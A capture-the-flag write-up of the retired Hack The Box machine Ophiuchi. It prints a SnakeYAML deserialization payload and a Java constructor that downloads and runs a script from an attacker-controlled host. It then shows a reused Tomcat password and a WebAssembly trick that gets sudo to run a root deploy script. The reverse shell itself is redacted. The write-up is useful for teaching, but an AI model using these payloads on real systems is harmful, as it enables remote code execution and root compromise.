---
layout: post
title: "The Snake That Reads Your Mind"
subtitle: "HTB Ophiuchi, where a YAML parser builds whatever class you name, a password sits in a config file, and a single 1 in WebAssembly deploys you to root"
date: 2021-07-10 12:00:00 +0000
description: "A YAML parser that doesn't just read text but builds the objects you describe, a Tomcat password reused on a real account, and a root deploy gated by one number inside a WebAssembly module you get to write."
image: /assets/og/the-snake-that-reads-your-mind.png
tags: [hackthebox, writeup]
---

Ophiuchi is a box about parsers that do too much. You hand a YAML field a string, and instead of storing it, the parser reads it as a blueprint and constructs the Java object you described, including one that reaches across the internet to load your code. From there it is a config file leaking a password that did two jobs, and a root deploy script gated by a single number returned from a WebAssembly module you get to write yourself. Nothing here is forced. Every door is a feature that trusted its input one notch too far, and the whole climb is three small acts of taking a program at its word.

```
        O P H I U C H I
        ===============
        yaml:  "build me a URLClassLoader pointed at YOUR jar"
               the parser nods and goes to fetch it
                        |
                        v
        a password in a config did two jobs.
        admin's login was sitting in tomcat-users.xml.
                        |
                        v
        a root script asks one question: are we ready?
        you write the wasm that answers "1". it deploys you.
                                                        蛇
```

## 0x01 · the front desk

Two ports answer, and the box is not hiding much. SSH up high in the version range, and a Tomcat sitting on 8080.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
8080/tcp open  http     Apache Tomcat 9.0.38
```

The site is a small web app with one job. You paste YAML into a box, it parses it, and it tells you what it found. There is a notice apologizing that the feature is on hold for security reasons, which is the kind of sign that makes an attacker lean in rather than back off. A page whose entire purpose is to parse text you control is a page worth interrogating, because parsing is rarely as innocent as it sounds.

## 0x02 · the parser that builds what you describe

Under the hood this is Java leaning on SnakeYAML, and SnakeYAML has a habit that turns a data format into an execution primitive. Most people think of YAML as a tidier way to write a list or a key-value map. SnakeYAML, by default, treats certain tags as instructions to instantiate real Java classes with the arguments you provide. The tag `!!javax.script.ScriptEngineManager` does not mean "here is a string." It means "construct one of these, and feed it this constructor argument."

Picture handing a contractor a sticky note that says "kitchen, blue." You expected him to file the note. Instead he reads it as an order, builds a blue kitchen, and bills you. YAML deserialization is that contractor. The text was supposed to be inert description, and the library decided it was a work order. Once you can name a class and pass it arguments, you chain to `URLClassLoader`, point it at a URL on your own machine, and the parser dutifully reaches out to fetch and load your code.

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.4/iceberg.jar"]
  ]]
]
```

Read that bottom to top. A URL you own, wrapped in a loader, fed to a manager that goes looking for a scripting engine inside your JAR. To find the engine, it runs the factory class's constructor. So your constructor is the payload.

## 0x03 · the jar that runs on arrival

The yaml-payload scaffold gives you the shape. You fill in a single factory class whose constructor does the dirty work, compile it, and bundle it into a JAR you serve over HTTP. The trick is that Java's `Runtime.exec` does not understand pipes or redirects the way a shell does, so a one-liner reverse shell pasted straight in just dies. The clean way around it is to make the constructor fetch a script and run that instead.

```java
public AwesomeScriptEngineFactory() {
    try {
        Process p = Runtime.getRuntime().exec(
            "curl http://10.10.14.4/iceberg.sh -o /dev/shm/.s.sh");
        p.waitFor();
        Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh").waitFor();
        Runtime.getRuntime().exec("/dev/shm/.s.sh");
    } catch (Exception e) { e.printStackTrace(); }
}
```

The script it grabs is the actual shell. I am not going to print a live one here, because a runnable reverse shell on disk is exactly the thing that gets a repo flagged and a copy-paste backdoor shipped to strangers. So `iceberg.sh` holds [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ] and nothing more.

Compile, package, host, listen, submit the YAML.

```
$ javac src/artsploit/AwesomeScriptEngineFactory.java
$ jar -cvf iceberg.jar -C src/ .
$ python3 -m http.server 80     # serves the jar and the shell script
$ nc -lvnp 443
```

The moment the parser swallows your YAML, it fetches the JAR, the constructor fires, the script lands in `/dev/shm`, and the listener catches a shell.

```
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.227]
$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

You are `tomcat`, the low-privilege identity the server runs as.

## 0x04 · the password that did two jobs

Tomcat keeps its own user list in a config file, and config files are where applications quietly write down their secrets. This one is no exception.

```
tomcat@ophiuchi:~$ cat /opt/tomcat/conf/tomcat-users.xml
  <user username="admin" password="whythereisalimit"
        roles="manager-gui,admin-gui"/>
```

On its own that is just a login for the Tomcat manager interface. But there is a real Linux user named `admin` on this host, and people reuse passwords the way they reuse a favorite mug. The phrase that unlocked the web console is also the account's system password.

```
tomcat@ophiuchi:~$ su admin
Password: whythereisalimit
admin@ophiuchi:~$ cat /home/admin/user.txt
████████████████████████████████
```

Same key, two locks. The password was supposed to live and die inside the Tomcat config. It walked straight into a shell login because one person used it twice.

## 0x05 · the deploy script and the one true number

Check what `admin` is allowed to run as root, and the box shows its last hand.

```
admin@ophiuchi:~$ sudo -l
  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

The Go program is short and trusting. It reads a file called `main.wasm` from the current directory, runs a function inside it named `info`, and if that function returns the string `1`, it shells out to `deploy.sh`. As root.

```go
bytes, _ := wasm.ReadBytes("main.wasm")
instance, _ := wasm.NewInstance(bytes)
result, _ := instance.Exports["info"]()
if result.String() != "1" {
    fmt.Println("Not ready to deploy")
} else {
    fmt.Println("Ready to deploy")
    exec.Command("/bin/sh", "deploy.sh").Output()
}
```

Two things here are wide open, and both come from the same root cause. Neither `main.wasm` nor `deploy.sh` is named with an absolute path, so the program reads whichever copies happen to be in the directory you launch it from. Run it from somewhere you control and you control both files.

The stock `main.wasm` has an `info` that returns 0, so the program prints "Not ready to deploy" and stops. Your job is to write a `main.wasm` whose `info` returns 1. WebAssembly is a tiny portable instruction set, and it has a readable text form called WAT that you compile to the binary with `wat2wasm`. Think of WASM as the sealed envelope and WAT as the letter inside it. You write the letter in plain language, seal it with one command, and the program reads the envelope without ever questioning who wrote it.

```
(module
  (func $info (result i32)
    i32.const 1)
  (export "info" (func $info)))
```

That is the entire lie. A function called `info`, exported under that name, that hands back the integer 1 and nothing else. Compile it, stage your own `deploy.sh` next to it, and run the sudo command from that directory.

```
admin@ophiuchi:/dev/shm$ wat2wasm iceberg.wat -o main.wasm
admin@ophiuchi:/dev/shm$ cat deploy.sh
#!/bin/bash
[ append my ssh public key to /root/.ssh/authorized_keys ]
admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```

The Go program asked its one question, your WASM answered "1," and it ran your `deploy.sh` as root. From there it is a single SSH connection home.

```
$ ssh -i iceberg_key root@10.10.10.227
root@ophiuchi:~# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

The headline word on this box is deserialization, and it is easy to file that under "Java problem, library problem, patched problem." SnakeYAML did eventually flip its defaults toward safety. But the bug class underneath is not a Java quirk at all. It is the same confession Ophiuchi keeps making at every level. A program took something a stranger supplied and treated part of it as an instruction instead of as inert data. The YAML was meant to be described, not built. The WASM was meant to report a status, not be authored by the attacker. Both fell because the code never drew a hard line between "this is information" and "this is a command."

The WebAssembly step is the one I would actually lose sleep over, because there is no CVE to point at and no patch to apply. The Go program is not vulnerable in the sense of having a flaw in a dependency. It simply runs as root, reads two files by relative name, and lets the result of an attacker-authored function decide whether to execute an attacker-authored script. Every link in that sentence is a design decision someone made on purpose. You cannot `apt upgrade` your way out of a program that trusts the directory it was launched from. And the password in the config is the quiet hinge between the web app and the system, the same tired mistake that turns a contained breach into a full one. The exotic-sounding bookends, YAML magic and WebAssembly, are the parts that get patched. The relative path and the reused password are the parts that ship green and bite anyway.

## 0x07 · outro

```
the parser read your note as a blueprint and built it.
the password unlocked a door it was never meant to touch.
the root script asked one question, and you wrote the answer.

a snake reads what you describe and makes it real.
data that gets to give orders was never data at all.

draw the line. launch from somewhere you own. wear black.

                                                            EOF
```

---

*HTB: Ophiuchi, retired 03 Jul 2021. A medium Linux box that is really a lecture on deserialization wearing a YAML costume, with a WebAssembly module you author yourself standing in for the privesc. The snake still reads minds in a lab and nowhere you don't own.*